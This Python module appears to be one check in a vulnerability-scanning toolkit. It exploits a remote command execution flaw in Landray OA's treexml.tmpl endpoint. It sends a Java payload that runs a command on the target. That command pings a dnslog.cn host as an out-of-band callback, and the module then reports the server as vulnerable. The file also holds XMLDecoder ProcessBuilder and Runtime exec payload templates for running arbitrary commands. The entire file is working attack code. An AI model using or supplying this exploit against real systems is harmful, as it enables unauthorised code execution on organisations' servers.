import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

payload_template_processbuilder = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="{0}">Template</array> <void method="start" id="process"> </void> </void> </java>'
payload_template_runtime = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <object class="java.lang.Runtime" method="getRuntime"> <void method="exec"> <array class="java.lang.String" length="{0}"> Template </array> </void> </object> </java>'


def 蓝凌OA_treeXml_远程命令执行(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",

    }
    data = '''s_bean=ruleFormulaValidate&script=try {
    String cmd = "ping 123456.0d7a20.dnslog.cn";
    Process child = Runtime.getRuntime().exec(cmd);
    } catch (IOException e) {
    System.err.println(e);
    }'''
    exp_url = urldata + 'data/sys-common/treexml.tmpl'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.post(exp_url, headers=headers, data=data, verify=False)
        if respones.status_code == 200:
            print(Vcolors.RED + "[+] 蓝凌OA_treeXml_远程命令执行存在" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 蓝凌OA_treeXml_远程命令执行可能不存在" +Vcolors.ENDC)
    except:
        logging.error("蓝凌OA_treeXml_远程命令执行脚本出现异常")

